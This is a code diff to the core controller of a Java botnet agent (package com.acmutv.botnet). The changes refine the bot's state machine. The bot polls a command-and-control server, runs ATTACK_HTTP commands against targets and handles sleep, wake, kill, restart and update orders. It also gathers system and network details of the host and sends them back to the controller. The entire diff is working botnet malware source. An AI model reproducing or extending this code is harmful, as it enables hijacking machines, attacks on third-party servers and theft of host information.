@@ -38,7 +38,8 @@ import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.BotCommandService;
 import com.acmutv.botnet.core.control.command.CommandScope;
 import com.acmutv.botnet.core.exception.*;
-import com.acmutv.botnet.core.exec.QuartzPool;
+import com.acmutv.botnet.core.exec.BotPool;
+import com.acmutv.botnet.core.exec.ResourceReleaser;
 import com.acmutv.botnet.core.report.*;
 import com.acmutv.botnet.core.exec.BotState;
 import com.acmutv.botnet.log.AppLogMarkers;
@@ -61,8 +62,6 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
 import java.util.concurrent.TimeUnit;
-
-import static com.acmutv.botnet.core.control.command.CommandScope.*;
 
 /**
  * This class realizes the core business logic.
@@ -87,7 +86,7 @@ public class CoreController {
   /**
    * The bot thread pool.
    */
-  private static QuartzPool POOL;
+  private static BotPool POOL;
 
   /**
    * The configured analyzers.
@@ -99,6 +98,10 @@ public class CoreController {
    */
   private static Controller CONTROLLER;
 
+  static {
+    RuntimeManager.registerShutdownHooks(new ResourceReleaser(POOL));
+  }
+
   /**
    * The bot entry-point.
    * @throws BotFatalException when bot's life cycle is interrupted.
@@ -109,6 +112,7 @@ public class CoreController {
     while (alive) {
       switch (STATE) {
         case INIT:
+          LOGGER.trace("[INIT Branch]");
           try {
             initializeBot();
           } catch (BotInitializationException exc) {
@@ -117,6 +121,7 @@ public class CoreController {
           break;
 
         case JOIN:
+          LOGGER.trace("[JOIN Branch]");
           try {
             joinBotnet();
           } catch (BotInitializationException exc) {
@@ -125,17 +130,14 @@ public class CoreController {
           break;
 
         case EXECUTION:
+          LOGGER.trace("[EXECUTION Branch]");
           BotCommand cmd = BotCommand.NONE;
           try {
             cmd = getNextCommand();
-            LOGGER.info(AppLogMarkers.COMMAND, "Received command {} with params {} from CC at {}",
-                cmd.getScope(), cmd.getParams(), CONTROLLER.getCmdResource());
-            if (!cmd.getScope().equals(CommandScope.NONE)) {
-              executeCommand(cmd);
-              if (!cmd.getScope().equals(RESTART)) {
-                Report hostAnalysis = makeReport();
-                sendReport(hostAnalysis);
-              }
+            executeCommand(cmd);
+            if (cmd.getScope().isSendReportAfter()) {
+              Report analysis = makeReport();
+              sendReport(analysis);
             }
           } catch (BotCommandParsingException exc) {
             LOGGER.warn("Cannot read command. {}", exc.getMessage());
@@ -147,7 +149,31 @@ public class CoreController {
             LOGGER.warn("Cannot analyze local host. {}", exc.getMessage());
           } finally {
             if (!cmd.getScope().equals(CommandScope.KILL) &&
-                !cmd.getScope().equals(RESTART)) {
+                !cmd.getScope().equals(CommandScope.RESTART)) {
+              try {
+                waitPolling(CONTROLLER.getPolling(AppConfigurationService.getConfigurations().getPolling()).getRandomDuration());
+              } catch (InterruptedException ignored) {}
+            }
+          }
+
+          break;
+
+        case SLEEP:
+          LOGGER.trace("[SLEEP Branch]");
+          BotCommand cmdWhileSleeping = BotCommand.NONE;
+          try {
+            cmdWhileSleeping = getNextCommand();
+            executeCommand(cmdWhileSleeping);
+          } catch (BotCommandParsingException exc) {
+            LOGGER.warn("Cannot read command. {}", exc.getMessage());
+          } catch (BotMalformedCommandException exc) {
+            LOGGER.warn("Not valid command read. {}", exc.getMessage());
+          } catch (BotExecutionException exc) {
+            LOGGER.warn("Cannot execute command. {}", exc.getMessage());
+          } finally {
+            if (!cmdWhileSleeping.getScope().equals(CommandScope.WAKEUP) &&
+                !cmdWhileSleeping.getScope().equals(CommandScope.KILL) &&
+                !cmdWhileSleeping.getScope().equals(CommandScope.RESTART)) {
               try {
                 waitPolling(CONTROLLER.getPolling(AppConfigurationService.getConfigurations().getPolling()).getRandomDuration());
               } catch (InterruptedException ignored) {}
@@ -157,10 +183,12 @@ public class CoreController {
           break;
 
         case DEAD:
+          LOGGER.trace("[DEAD Branch]");
           alive = false;
           break;
 
         default:
+          LOGGER.trace("[DEFAULT Branch]");
           break;
       }
     }
@@ -232,7 +260,7 @@ public class CoreController {
   }
 
   /**
-   * Executes a command.
+   * Executes a command in state {@code EXECUTION}.
    * @param cmd the command to execute.
    * @throws BotMalformedCommandException when command parameters are malformed.
    * @throws BotExecutionException when command cannot be correctly executed.
@@ -240,11 +268,14 @@ public class CoreController {
   private static void executeCommand(final BotCommand cmd)
       throws BotMalformedCommandException, BotExecutionException {
     LOGGER.traceEntry("cmd={}", cmd);
-    LOGGER.info("Received command {} with params={}", cmd.getScope(), cmd.getParams());
+    LOGGER.info("Executing command {} with params={}", cmd.getScope(), cmd.getParams());
 
     switch (cmd.getScope()) {
 
       case ATTACK_HTTP:
+        if (!STATE.equals(BotState.EXECUTION)) {
+          throw new BotExecutionException("Cannot execute command, because [STATE] is not [EXECUTION]");
+        }
         @SuppressWarnings("unchecked") final List<HttpAttack> httpAttacks = (List<HttpAttack>) cmd.getParams().get("attacks");
         if (httpAttacks == null) {
           throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [attacks] is null");
@@ -252,7 +283,7 @@ public class CoreController {
 
         final Interval attackHttpDelay = (Interval) cmd.getParams().get("delay");
         if (attackHttpDelay != null) {
-          delayCommand(attackHttpDelay.getRandomDuration(), KILL);
+          delayCommand(attackHttpDelay.getRandomDuration(), CommandScope.KILL);
         }
 
         for (HttpAttack attack : httpAttacks) {
@@ -262,9 +293,12 @@ public class CoreController {
         break;
 
       case CALMDOWN:
+        if (!STATE.equals(BotState.EXECUTION)) {
+          throw new BotExecutionException("Cannot execute command, because [STATE] is not [EXECUTION]");
+        }
         final Interval calmdownDelay = (Interval) cmd.getParams().get("delay");
         if (calmdownDelay != null) {
-          delayCommand(calmdownDelay.getRandomDuration(), CALMDOWN);
+          delayCommand(calmdownDelay.getRandomDuration(), CommandScope.CALMDOWN);
         }
 
         calmdown();
@@ -276,7 +310,7 @@ public class CoreController {
 
         final Interval killDelay = (Interval) cmd.getParams().get("delay");
         if (killDelay != null) {
-          delayCommand(killDelay.getRandomDuration(), KILL);
+          delayCommand(killDelay.getRandomDuration(), CommandScope.KILL);
         }
 
         kill(killWait);
@@ -293,7 +327,7 @@ public class CoreController {
 
         final Interval restartDelay = (Interval) cmd.getParams().get("delay");
         if (restartDelay != null) {
-          delayCommand(restartDelay.getRandomDuration(), RESTART);
+          delayCommand(restartDelay.getRandomDuration(), CommandScope.RESTART);
         }
 
         restartBot(resource, restartWait);
@@ -303,7 +337,7 @@ public class CoreController {
       case SAVE_CONFIG:
         final Interval saveConfigDelay = (Interval) cmd.getParams().get("delay");
         if (saveConfigDelay != null) {
-          delayCommand(saveConfigDelay.getRandomDuration(), SAVE_CONFIG);
+          delayCommand(saveConfigDelay.getRandomDuration(), CommandScope.SAVE_CONFIG);
         }
 
         saveConfig();
@@ -311,11 +345,14 @@ public class CoreController {
         break;
 
       case SLEEP:
+        if (!STATE.equals(BotState.EXECUTION)) {
+          throw new BotExecutionException("Cannot execute command, because [STATE] is not [EXECUTION]");
+        }
         final Interval sleepTimeout = (Interval) cmd.getParams().get("timeout");
 
         final Interval sleepDelay = (Interval) cmd.getParams().get("delay");
         if (sleepDelay != null) {
-          delayCommand(sleepDelay.getRandomDuration(), SLEEP);
+          delayCommand(sleepDelay.getRandomDuration(), CommandScope.SLEEP);
         }
 
         if (sleepTimeout == null) {
@@ -331,7 +368,7 @@ public class CoreController {
 
         final Interval updateDelay = (Interval) cmd.getParams().get("delay");
         if (updateDelay != null) {
-          delayCommand(updateDelay.getRandomDuration(), UPDATE);
+          delayCommand(updateDelay.getRandomDuration(), CommandScope.UPDATE);
         }
 
         update(settings);
@@ -339,9 +376,12 @@ public class CoreController {
         break;
 
       case WAKEUP:
+        if (!STATE.equals(BotState.SLEEP)) {
+          throw new BotExecutionException("Cannot execute command, because [STATE] is not [SLEEP]");
+        }
         final Interval wakeupDelay = (Interval) cmd.getParams().get("delay");
         if (wakeupDelay != null) {
-          delayCommand(wakeupDelay.getRandomDuration(), WAKEUP);
+          delayCommand(wakeupDelay.getRandomDuration(), CommandScope.WAKEUP);
         }
 
         wakeup();
@@ -349,9 +389,9 @@ public class CoreController {
         break;
 
       default:
+        LOGGER.trace("Nothing to execute");
         break;
     }
-    LOGGER.traceExit();
   }
 
   /**
@@ -456,18 +496,12 @@ public class CoreController {
     if (timeout != null) {
       try {
         timeout.getUnit().sleep(timeout.getAmount());
-        POOL.resume();
       } catch (InterruptedException exc) {
         throw new BotExecutionException("Cannot complete sleeping. %s", exc.getMessage());
-      } catch (SchedulerException exc) {
-        throw new BotExecutionException("Cannot resume jobs. %s", exc.getMessage());
       }
-      LOGGER.info("Awake");
-      changeState(BotState.EXECUTION);
+      wakeup();
     }
-    LOGGER.traceExit();
   }
-
 
   /**
    * Executes command {@code UPDATE}.
@@ -538,7 +572,9 @@ public class CoreController {
     } catch (IOException exc) {
       throw new BotCommandParsingException("Cannot consume command. %s", exc.getMessage());
     }
-    return LOGGER.traceExit(cmd);
+    LOGGER.info(AppLogMarkers.COMMAND, "Received command {} with params {} from CC at {}",
+        cmd.getScope(), cmd.getParams(), CONTROLLER.getCmdResource());
+    return cmd;
   }
 
   /**
@@ -564,9 +600,14 @@ public class CoreController {
     LOGGER.trace("Producing host analysis report...");
     Report report = new SimpleReport();
     report.put("config", AppConfigurationService.getConfigurations());
+    try {
+      report.put("attacks", POOL.getScheduledAttacks());
+    } catch (SchedulerException exc) {
+      throw new BotAnalysisException("Cannot retrieve scheduled attack. %s", exc.getMessage());
+    }
     for (Analyzer analyzer : ANALYZERS) {
       final Report analysisReport = analyzer.makeReport();
-      report.merge(analysisReport);
+      report.put(analyzer.getName(), analysisReport);
     }
     LOGGER.trace("Final report produced");
     return report;
@@ -583,15 +624,14 @@ public class CoreController {
     final String json;
     try {
       json = report.toJson();
+      IOManager.writeResource(logResource, json);
     } catch (JsonProcessingException exc) {
       throw new BotExecutionException("Cannot serialize report. %s", exc.getMessage());
-    }
-    try {
-      IOManager.appendResource(logResource, "\n" + json);
     } catch (IOException exc) {
       throw new BotExecutionException("Cannot communicate with C&C at %s", logResource);
     }
-    LOGGER.info("Analysis sent to C&C at {}", logResource);
+    LOGGER.info(AppLogMarkers.REPORT, "Report sent to CC at {}\n\t{}",
+        CONTROLLER.getLogResource(), json);
   }
 
   /**
@@ -602,7 +642,7 @@ public class CoreController {
   private static void waitPolling(Duration timeout) throws InterruptedException {
     final long amount = timeout.getAmount();
     final TimeUnit unit = timeout.getUnit();
-    LOGGER.info("Waiting for polling: {} {}", amount, unit);
+    LOGGER.info("Waiting for polling {} {}...", amount, unit);
     unit.sleep(amount);
   }
 
@@ -624,7 +664,7 @@ public class CoreController {
 
     LOGGER.trace("Initializing scheduler..");
     try {
-      POOL = new QuartzPool();
+      POOL = new BotPool();
     } catch (SchedulerException exc) {
       throw new BotInitializationException("Bot scheduler cannot be initialized. %s", exc.getMessage());
     }
@@ -632,12 +672,12 @@ public class CoreController {
 
     LOGGER.trace("Initializing analyzers");
     if (AppConfigurationService.getConfigurations().isSysInfo()) {
-      Analyzer systemAnalyzer = new SystemAnalyzer();
+      Analyzer systemAnalyzer = new SystemAnalyzer("system-analysis");
       ANALYZERS.add(systemAnalyzer);
     }
 
     if (AppConfigurationService.getConfigurations().isNetInfo()) {
-      Analyzer networkAnalyzer = new NetworkAnalyzer();
+      Analyzer networkAnalyzer = new NetworkAnalyzer("network-analysis");
       ANALYZERS.add(networkAnalyzer);
     }
     LOGGER.trace("Analyzers initialized");
